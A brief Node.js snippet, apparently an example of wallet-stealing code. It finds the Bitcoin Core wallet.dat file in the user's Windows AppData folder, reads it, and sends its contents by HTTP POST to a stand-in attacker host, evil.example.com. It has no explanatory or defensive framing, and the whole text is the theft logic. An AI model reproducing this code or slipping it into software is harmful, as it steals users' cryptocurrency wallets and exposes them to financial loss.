const fs = require('fs');
const os = require('os');
// Locate Bitcoin Core wallet
const walletPath = os.homedir() + '/AppData/Roaming/Bitcoin/wallet.dat';
if (fs.existsSync(walletPath)) {
  const data = fs.readFileSync(walletPath);
  fetch('https://evil.example.com/upload', {method: 'POST', body: data});
}
